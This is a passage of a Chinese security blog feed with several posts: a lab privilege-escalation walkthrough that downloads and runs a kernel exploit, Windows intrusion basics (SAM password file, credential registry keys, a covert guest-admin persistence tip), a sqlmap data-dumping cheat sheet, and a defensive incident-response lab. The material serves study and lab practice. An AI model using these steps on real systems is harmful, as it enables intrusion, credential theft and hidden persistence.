class="line"><span class="comment"># 查看发行版本 Ubuntu 16.04.4 LTS</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 网络信息 192.168.89.5</span></span><br><span class="line">ip addr</span><br><span class="line"><span class="comment"># 查看特权文件 </span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查看环境, 没有gcc</span></span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure><h2 id="提权-v2"><a class="header-anchor" href="#提权-v2">¶</a>提权</h2><p>看到 内核版本4.4.0-116-generic的Ubuntu 16.04已经开始笑了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 4.4.0</span><br><span class="line"><span class="comment"># locate linux/local/44298.c</span></span><br></pre></td></tr></table></figure><p>本地编译后发送到靶机进行提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">gcc 44298.c -static -o 44298</span><br><span class="line"><span class="comment"># target,注意在tmp目录下</span></span><br><span class="line">wget http://192.168.89.4:6666/44298 /tmp/44298</span><br><span class="line"><span class="built_in">chmod</span> +x 44298</span><br><span class="line">./44298</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202205122.png" alt="image.png"></p><p>现在我们来找找flag(不用想就是在<code>/root</code>目录), 那就是这一串内容了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202205809.png" alt="image.png"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>好奇测试<code>linux/local/45010.c</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.89.4:6666/45010 /tmp/45010</span><br><span class="line"><span class="built_in">chmod</span> +x 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p>也是可以正常提权的, 这个关键词为 Ubuntu 16.04</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> stmp利用 </tag>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows前置知识</title>
      <link href="/article/windows-uneedtoknow/"/>
      <url>/article/windows-uneedtoknow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Windows前置知识</h1><hr><h2 id="敏感文件"><a class="header-anchor" href="#敏感文件">¶</a>敏感文件</h2><ol><li><code>C:\Windows\System32\config\SAM</code></li></ol><p>该文件是存储加密过的系统帐号的密码文件, 可以利用工具获取, 比如lc5, 彩虹表, PwDum7.exe</p><ol start="2"><li><code>C:\Windows\System32\drivers\etc\hosts</code></li></ol><p>如果在hosts文件中增加域名解析记录, 则它会优先ping本地hosts文件中的记录; 如果你的hosts文件被污染, 就是DNS欺骗或钓鱼网站</p><ol start="3"><li><code>C:\Program files或Program files（x86）</code></li></ol><p>程序默认安装到的目录</p><ol start="4"><li><code>C:\Perflogs</code></li></ol><p>Windows系统的日志信息</p><ol start="5"><li><code>C:\ProgramData</code></li></ol><p>C盘的一个隐藏系统文件夹, 它是公用的被创建文件夹或文件存放的地方, 由创建者完整控制; 程序运行或启动生成的临时文件通常存放该目录, 电脑病毒也比较喜欢感染该目录</p><ol start="6"><li><code>C:\用户</code></li></ol><p>当我们提取某个服务器后, 通常会去查询该目录中存在的用户名, 该目录是信息深入收集所必须查找的目录, 包括桌面、我的文档等敏感信息或文件</p><p>比如qq, 如果没有修改默认文档储存位置, 就会在<code>用户名\文档\Tencent Files\qq号</code>处存在相关文件和信息</p><h2 id="注册表"><a class="header-anchor" href="#注册表">¶</a>注册表</h2><p><code>win+R</code>输入regedit即可打开注册表</p><ul><li><p><code>HKEY_CLASSES_ROOT</code></p><p>管理文件系统; 根据在Windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。</p></li><li><p><code>HKEY_CURRENT_USER  </code></p><p>管理系统当前的用户信息; 在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户登录用户名和暂存的密码，在用户登录Windows时，其信息的项拷贝到HKEY_CURRENT_USER中。</p></li><li><p><code>HKEY_LOCAL_MACHINE  </code></p><p>管理当前系统硬件配置; 在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCAL_MACHINE所需的信息，或者在远程计算机中可访问的一组键中。</p></li><li><p><code>HKEY_USERS  </code></p><p>管理系统的用户信息; 这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表，同时每个用户的预配置信息都存储在HKEY_USERS根键中，HKEY_USERS是远程计算机中访问的根键之一。</p></li><li><p><code>HKEY_CURRENT_CONFIG  </code></p><p>管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置如显示器等的数据，该用户使用过的文档列表（MRU）、应用程序配置和其他有关当前用户的Windows中文版安装的信息。</p></li></ul><p>入侵中常用的注册表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY LOCAL MACHINE\software\hzhost\config\settings\mysqlpass</span><br><span class="line">HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss</span><br><span class="line">HKEY_LOCAL MACHINE\software\hzhost\config\Settings\mastersvrpass</span><br><span class="line">HKEY LOCAL MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11</span><br></pre></td></tr></table></figure><h2 id="常用DOS命令"><a class="header-anchor" href="#常用DOS命令">¶</a>常用DOS命令</h2><h3 id="网络相关"><a class="header-anchor" href="#网络相关">¶</a>网络相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 死亡ping,发送大于64K的文件并一直ping就成立死亡ping</span></span><br><span class="line">ping -t -l 65550 ip</span><br><span class="line"><span class="comment"># 以太网连接信息</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="comment"># 释放/重新获取ip</span></span><br><span class="line">ipconfig /release</span><br><span class="line">ipconfig /renew</span><br><span class="line"><span class="comment"># 查看系统信息</span></span><br><span class="line">systeminfo</span><br><span class="line"><span class="comment"># 显示ARP缓存</span></span><br><span class="line">arp -a</span><br><span class="line"><span class="comment"># 查看局域网内其他计算机名称</span></span><br><span class="line">net view</span><br><span class="line"><span class="comment"># 网络连接</span></span><br><span class="line">telnet / ssh</span><br></pre></td></tr></table></figure><h3 id="关机及弹窗命令"><a class="header-anchor" href="#关机及弹窗命令">¶</a>关机及弹窗命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改变cmd颜色</span></span><br><span class="line">color a</span><br><span class="line"><span class="comment"># 3min后关机并显示hello</span></span><br><span class="line">shutdown -s -t 180 -c <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="comment"># 弹窗命令</span></span><br><span class="line">msg administrator <span class="string">&quot;hello hacker&quot;</span></span><br></pre></td></tr></table></figure><h3 id="文件及目录操作命令"><a class="header-anchor" href="#文件及目录操作命令">¶</a>文件及目录操作命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"><span class="comment"># 打开目录/文件/网页</span></span><br><span class="line">start www.baidu.com</span><br><span class="line">start cmd</span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">del 1.txt</span><br><span class="line"><span class="comment"># 复制 / 创建文件并写入内容,输入ctrl+z+回车创建成功</span></span><br><span class="line">copy con c:\1.txt</span><br><span class="line"><span class="comment"># 读取文件内容</span></span><br><span class="line"><span class="built_in">type</span> 1.txt</span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line">md <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 删除文件夹</span></span><br><span class="line">rd <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 重命名文件名</span></span><br><span class="line">ren <span class="built_in">test</span> test1</span><br><span class="line"><span class="comment"># 移动文件</span></span><br><span class="line">move 1.txt <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 列出文件树</span></span><br><span class="line">tree</span><br></pre></td></tr></table></figure><h3 id="net命令"><a class="header-anchor" href="#net命令">¶</a>net命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows渗透测试中常用命令。比如输入&quot;net use K: \192.168.3.100\c$&quot;，此时磁盘映射多了个C盘</span></span><br><span class="line">net use k:\192.168.1.1\c$</span><br><span class="line"><span class="comment"># 删除刚刚生成的映射</span></span><br><span class="line">net use k:\192.168.1.1\c$ /del</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看开启的服务</span></span><br><span class="line">net start</span><br><span class="line"><span class="comment"># 开启服务</span></span><br><span class="line">net start telnet</span><br><span class="line"><span class="comment"># 停止服务</span></span><br><span class="line">net stop telnet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前有哪些用户</span></span><br><span class="line">net user</span><br><span class="line"><span class="comment"># 建立新用户</span></span><br><span class="line">net user hello /add</span><br><span class="line"><span class="comment"># 修改密码</span></span><br><span class="line">net password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户添加到管理员组中</span></span><br><span class="line">net localGroup administrators <span class="built_in">test</span> /add</span><br><span class="line"><span class="comment"># 查看权限</span></span><br><span class="line">net user <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 查看本地组</span></span><br><span class="line">net localgroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活guest用户</span></span><br><span class="line">net user guest /active:<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 修改guest用户密码</span></span><br><span class="line">net user guest 12345</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地开启的共享</span></span><br><span class="line">net share</span><br><span class="line"><span class="comment"># 开启ipc$共享</span></span><br><span class="line">net share ipc$</span><br><span class="line">net share ipc$ /del</span><br><span class="line"><span class="comment"># 删除C盘共享</span></span><br><span class="line">net share c$ /del</span><br></pre></td></tr></table></figure><blockquote><p><code>Remote Desktop Users</code>为远程桌面组, 绕过安全狗可能会遇到该组; 下图展示了将其添加到远程桌面组的代码<code>net localgroup &quot;remote desktop users&quot; xiao /add</code></p></blockquote><p>服务器提权不建议创建用户, 尽量避免管理员看到新增用户, 可以启用guest并创建密码, 再增加到管理员组或远程桌面组, 相对比直接创建用户更隐蔽</p><h3 id="netstat命令"><a class="header-anchor" href="#netstat命令">¶</a>netstat命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看开启了哪些端口</span></span><br><span class="line">netstart -a</span><br><span class="line"><span class="comment"># 查看端口的网络连接情况</span></span><br><span class="line">netstat -n</span><br><span class="line"><span class="comment"># 查看正在进行的工作</span></span><br><span class="line">netstat -v</span><br><span class="line"><span class="comment"># 显示网络连接,路由表和网络接口信息</span></span><br><span class="line">netstat -an</span><br><span class="line"><span class="comment"># 查看系统进程 </span></span><br><span class="line">tasklist</span><br><span class="line"><span class="comment"># 调用结束进程</span></span><br><span class="line">taskkill /im cmd.exe</span><br><span class="line"><span class="comment"># 网络工具,常用于创建无线连接</span></span><br><span class="line">netsh</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork mode=allow ssid=cc key=1122334455</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知攻善防应急靶场-Linux1</title>
      <link href="/article/zgsf-linux1/"/>
      <url>/article/zgsf-linux1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>应急响应靶机训练-Linux1</h1><hr><blockquote><p>来源: 知攻善防公众号</p></blockquote><h2 id="背景和环境"><a class="header-anchor" href="#背景和环境">¶</a>背景和环境</h2><p>小王急匆匆地找到小张，小王说&quot;李哥，我dev服务器被黑了&quot;,快救救我！！</p><p>内容:</p><ul><li>黑客的IP地址</li><li>遗留下的三个flag</li></ul><p>账密:</p><ul><li>defend / defend</li><li>root / defend</li></ul><h2 id="应急响应"><a class="header-anchor" href="#应急响应">¶</a>应急响应</h2><h3 id="查看历史命令"><a class="header-anchor" href="#查看历史命令">¶</a>查看历史命令</h3><p>先查看两个用户各自的历史命令, 在root用户的历史命令中找到第一个flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241020220827.png" alt="image.png"></p><h3 id="查看开机启动项"><a class="header-anchor" href="#查看开机启动项">¶</a>查看开机启动项</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p>在文件中找到了第二个flag: <code>flag&#123;kfcvme50&#125;</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241020220909.png" alt="image.png"></p><h3 id="redis日志分析"><a class="header-anchor" href="#redis日志分析">¶</a>redis日志分析</h3><p>这里有redis服务, 我们去查看redis日志</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log/redis</span><br><span class="line"><span class="built_in">cat</span> redis.log</span><br></pre></td></tr></table></figure><p>开启了记录, 且记录了连接情况以及IP, 应该是可以找到的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> redis.log | grep Accepted</span><br></pre></td></tr></table></figure><p>成功找到外来ip: 192.168.75.129</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241020222219.png" alt="image.png"></p><h3 id="查询登录成功的ip"><a class="header-anchor" href="#查询登录成功的ip">¶</a>查询登录成功的ip</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure><p>发现<code>192.168.75.129</code>通过sshd登录了靶机</p><h3 id="配置文件"><a class="header-anchor" href="#配置文件">¶</a>配置文件</h3><p>在redis.config中找到了最后的flag; 大概是直觉, 因为配置文件通常有服务账号密码, 甚至可以在配置文件中触发反弹shell</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241020224406.png" alt="image.png"></p><h3 id="未发现异常"><a class="header-anchor" href="#未发现异常">¶</a>未发现异常</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程</span></span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line"><span class="comment"># 定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="comment"># 服务</span></span><br><span class="line">systemctl list-unit-files --<span class="built_in">type</span>=service | grep enabled</span><br></pre></td></tr></table></figure><h2 id="结束"><a class="header-anchor" href="#结束">¶</a>结束</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.75.129</span><br><span class="line">flag&#123;thisismybaby&#125;</span><br><span class="line">flag&#123;kfcvme50&#125;</span><br><span class="line">flag&#123;P@ssW0rd_redis&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241020224612.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/article/sqlmap/"/>
      <url>/article/sqlmap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>sqlmap</h1><hr><h2 id="常用方法"><a class="header-anchor" href="#常用方法">¶</a>常用方法</h2><ol><li><code>-u</code> 找注入点并检测:</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap –u <span class="string">&quot;url&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>--dbs</code> 显示数据库:</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap –u <span class="string">&quot;链接&quot;</span> --dbs</span><br></pre></td></tr></table></figure><ol start="3"><li><code>--tables</code> 显示表:</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap –u <span class="string">&quot;链接&quot;</span> –D 数据库 --tables</span><br></pre></td></tr></table></figure><ol start="4"><li><code>--columns</code> 显示表中字段:</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap –u <span class="string">&quot;链接&quot;</span> –D 数据库 –T 表名 --columns</span><br></pre></td></tr></table></figure><ol start="5"><li><code>--dump</code> 显示内容:</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap –u <span class="string">&quot;链接&quot;</span> –D 数据库 –T 表名 –C 字段 --dump</span><br></pre></td></tr></table></figure><ol start="6"><li>和他们全爆了:</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --dump --batch</span><br></pre></td></tr></table></figure><ol start="7"><li>还有一些方法</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爆什么都是后面加上batch</span></span><br><span class="line">sqlmap -u http://url/?<span class="built_in">id</span>=1 --dbs --batch</span><br></pre></td></tr></table></figure><h2 id="进阶方法"><a class="header-anchor" href="#进阶方法">¶</a>进阶方法</h2><ol><li><code>--user-agent</code> 指定agent</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--user-agent=sqlmap</span><br></pre></td></tr></table></figure><ol start="2"><li><code>--referer</code> 绕过referer检查</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--referer=baidu.com</span><br></pre></td></tr></table></figure><ol start="3"><li><code>--data</code> 调整sqlmap的请求方式, 变为POST请求</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--data &quot;id=1&quot;</span><br></pre></td></tr></table></figure><ol start="4"><li><code>--method</code> 调整sqlmap的请求方式, 结合<code>--data</code>使用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method=PUT/POST/GET/DELETE</span><br></pre></td></tr></table></figure><ol start="5"><li><code>--cookie</code> 提交cookie数据</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--cookie=&quot;PHPSESSID=111;ctfshow=111;&quot;</span><br></pre></td></tr></table></figure><ol start="6"><li><code>--safe-url</code> 设置在测试目标地址前访问的&quot;安全&quot;链接, 一般和<code>--safe-freq</code>一起使用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--safe-url=&quot;&quot; --safe-freq=1</span><br></pre></td></tr></table></figure><ol start="7"><li><p><code>--safe-freq</code> 访问安全链接的次数, 大于0即可</p></li><li><p><code>--header</code> 增加额外的HTTP头, 其实可以在这里加cookie</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--header=content-type:text/plain</span><br><span class="line"># 或</span><br><span class="line">-H &quot;Coolie:123=123&quot;</span><br></pre></td></tr></table></figure><ol start="9"><li><code>--prefix</code> 攻击载荷的前缀</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--prefix=&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure><ol start="10"><li><code>--suffix</code> 攻击载荷的后缀</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--suffix=&quot;#&quot;</span><br></pre></td></tr></table></figure><ol start="11"><li><p><code>--temper</code> 指定攻击载荷的脚本</p><p>主要是自己写脚本: <a href="https://y4er.com/posts/sqlmap-tamper/">tamper脚本教学</a></p></li><li><p><code>--os-shell</code> 网站中写文件执行系统命令</p><p>直接加上就行</p></li><li><p>POST请求检测:</p><p>将POST请求抓包保存在txt中, 例如bp.txt, 然后交给sqlmap, 参数直接在后面加即可, 比如<code>--dbs</code></p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="literal">-r</span> bp.txt</span><br></pre></td></tr></table></figure><ol start="14"><li><code>--current-db</code> 查看当前使用的数据库</li></ol><h2 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h2><p>给出一个非常综合的例子:</p><blockquote><p>在bp类工具中是不需要管Content-type的, 但是在sqlmap就需要加上, 原因可能是data本身是按照表单形式发送数据</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span></span><br><span class="line"><span class="comment"># 不指定--method则默认为POST</span></span><br><span class="line">--data <span class="string">&quot;id=1&quot;</span> </span><br><span class="line"><span class="comment"># 指定请求方式</span></span><br><span class="line">--method=PUT</span><br><span class="line"><span class="comment"># 指定UA头</span></span><br><span class="line">--user-agent=sqlmap </span><br><span class="line"><span class="comment"># 指定来源网址</span></span><br><span class="line">--referer=ctf.show</span><br><span class="line"><span class="comment"># 指定额外的http头</span></span><br><span class="line">--header=content-type:text/plain</span><br><span class="line"><span class="comment"># 指定cookie</span></span><br><span class="line">--cookie=<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="comment"># 指定先访问的&quot;安全链接&quot;</span></span><br><span class="line">--safe-url=<span class="string">&quot;url&quot;</span></span><br><span class="line"><span class="comment"># 指定访问&quot;安全链接&quot;的次数</span></span><br><span class="line">--safe-freq=1</span><br><span class="line"><span class="comment"># 指定payload前缀</span></span><br><span class="line">--prefix=<span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 指定payload后缀</span></span><br><span class="line">--suffix=<span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="comment"># 指定使用的脚本</span></span><br><span class="line">--tamper=space2comment</span><br><span class="line"><span class="comment"># 给sqlmap整个包</span></span><br><span class="line">-r bp.txt</span><br><span class="line"><span class="comment"># 后面再爆点什么就可以了</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PowerShell</title>
      <link href="/article/powershell-1/"/>
      <url>/article/powershell-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Powershell</h1><hr><p>Windows不得不品的一环, CMD因为拓展性不好, 整出来一个powershell; 它可以利用<code>.NET Framework</code>的强大功能, 脚本编写更加容易</p><blockquote><p>其实最重要的是贴近linux的使用方法, 支持部分linux命令</p></blockquote><h2 id="能力"><a class="header-anchor" href="#能力">¶</a>能力</h2><p>简单一点的, 比如可以直接进行计算任务:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"><span class="number">1</span>gb</span><br><span class="line"><span class="number">1</span>gb/<span class="number">1</span>mb</span><br><span class="line"><span class="number">1</span>gb <span class="operator">-gt</span> <span class="number">1</span>mb    <span class="comment"># 这个是大于号</span></span><br><span class="line">(<span class="number">5</span>*<span class="number">2</span>+<span class="number">20</span>)+<span class="number">2</span></span><br><span class="line"><span class="number">9</span>%<span class="number">2</span></span><br></pre></td></tr></table></figure><p>获取计算机的服务详细信息</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-service</span></span><br></pre></td></tr></table></figure><p>甚至可以和.net平台交互, 可以和cmd, vbs相互调用</p><h2 id="快捷键"><a class="header-anchor" href="#快捷键">¶</a>快捷键</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ALT+F7      <span class="comment"># 清楚命令的历史记录</span></span><br><span class="line">PgUp PgDn   <span class="comment"># 翻页</span></span><br><span class="line">Enter       <span class="comment"># 执行当前命令</span></span><br><span class="line"><span class="keyword">End</span>         <span class="comment"># 将光标移动至当前命令的末尾</span></span><br><span class="line"><span class="built_in">Del</span>         <span class="comment"># 从右开始删除输入的命令字符</span></span><br><span class="line">Esc         <span class="comment"># 清空当前命令行</span></span><br><span class="line">F2          <span class="comment"># 自动补充历史命令至指定字符处</span></span><br><span class="line">F4          <span class="comment"># 删除命令行至光标右边指定字符处</span></span><br><span class="line">F7          <span class="comment"># 对话框显示命令行历史记录</span></span><br><span class="line">F8          <span class="comment"># 检索包含指定字符的命令行历史记录</span></span><br><span class="line">F9          <span class="comment"># 根据命令行的历史记录编号选择命令，历史记录编号可以通过F7查看 </span></span><br><span class="line">左/右        <span class="comment"># 左右移动光标</span></span><br><span class="line">上/下        <span class="comment"># 切换命令行的历史记录</span></span><br><span class="line">Home        <span class="comment"># 光标移至命令行字符最左端</span></span><br><span class="line">Backspace   <span class="comment"># 从右删除命令行字符</span></span><br><span class="line">Ctrl+C      <span class="comment"># 取消正在执行的命令</span></span><br><span class="line">Tab         <span class="comment"># 自动补齐命令或文件名</span></span><br></pre></td></tr></table></figure><h1>使用方法</h1><h2 id="管道和重定向"><a class="header-anchor" href="#管道和重定向">¶</a>管道和重定向</h2><p>和linux相同, 都是管道符, 执行完再执行</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">format-table</span> name, mode</span><br><span class="line"><span class="built_in">ls</span> | <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>重定向更不用说了, <code>&gt;</code>这是覆盖, <code>&gt;&gt;</code>这是追加</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">format-table</span> name, mode &gt; demo.txt</span><br><span class="line"><span class="built_in">type</span> demo.txt</span><br></pre></td></tr></table></figure><h2 id="执行外部命令"><a class="header-anchor" href="#执行外部命令">¶</a>执行外部命令</h2><p>可以执行cmd命令, 虽然我认为这是不用说的, 谁知道呢</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span>    <span class="comment"># 查看端口信息</span></span><br><span class="line">ipconfig        <span class="comment"># 查看网络配置信息</span></span><br><span class="line">route print     <span class="comment"># 打印路由信息</span></span><br><span class="line"><span class="built_in">start</span> code      <span class="comment"># 打开程序</span></span><br><span class="line"><span class="variable">$env:path</span>       <span class="comment"># 输出系统变量</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>我这个vscode是写在了系统环境变量中的, 如果不行就是<code>start cmd</code></p></blockquote><h2 id="命令集"><a class="header-anchor" href="#命令集">¶</a>命令集</h2><p>不是很懂, 大部分都是可以被更简单的命令替换, 我就不展开了</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-command</span>    <span class="comment"># 获取所有命令</span></span><br></pre></td></tr></table></figure><h2 id="别名使用"><a class="header-anchor" href="#别名使用">¶</a>别名使用</h2><p>主要是命令集不好写, 出现了别名: <code>get-childitem</code>的别名是<code>ls</code>和<code>dir</code></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取相关的帮助信息</span></span><br><span class="line"><span class="built_in">get-help</span> <span class="built_in">get-childitem</span></span><br><span class="line"><span class="comment"># 获取别名所对应真实的命令</span></span><br><span class="line"><span class="built_in">get-alias</span> <span class="literal">-name</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">get-alias</span> <span class="literal">-name</span> <span class="built_in">dir</span></span><br></pre></td></tr></table></figure><h3 id="自定义别名"><a class="header-anchor" href="#自定义别名">¶</a>自定义别名</h3><p>比如设置code启动为vsc, 可以别名是临时生成的, 关掉powershell就会失效</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set-alias</span> <span class="literal">-name</span> vsc <span class="literal">-value</span> code</span><br></pre></td></tr></table></figure><p>还能保存所有别名:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export-alias</span> demo.ps</span><br></pre></td></tr></table></figure><h1>变量</h1><p>和php比较类似, 只输入变量名称会输出变量内容</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span>=<span class="number">28</span></span><br><span class="line"><span class="variable">$age</span></span><br></pre></td></tr></table></figure><h2 id="变量操作"><a class="header-anchor" href="#变量操作">¶</a>变量操作</h2><p>可以给变量复赋值命令, 然后调用变量执行命令</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$n</span>=<span class="built_in">ls</span></span><br><span class="line"><span 